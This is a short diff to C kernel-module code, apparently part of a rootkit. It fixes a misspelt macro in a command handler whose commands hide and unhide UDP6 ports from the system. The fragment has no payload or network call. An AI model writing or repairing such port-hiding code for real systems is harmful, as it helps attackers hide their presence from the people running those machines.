@@ -958,7 +958,7 @@ int execute_command(const char __user *str, size_t length)
 	    
     } else if (strcmp(str, CFG_HIDE_UDP6_PORT) == 0) {
         pr_info("Got hide udp6 port command\n");
-        str += sizeof(CFG_HIDE_UD6P_PORT);
+        str += sizeof(CFG_HIDE_UDP6_PORT);
 	hide_udp6_port(str);
     } else if (strcmp(str, CFG_UNHIDE_UDP6_PORT) == 0) {
         pr_info("Got unhide udp6 port command\n");
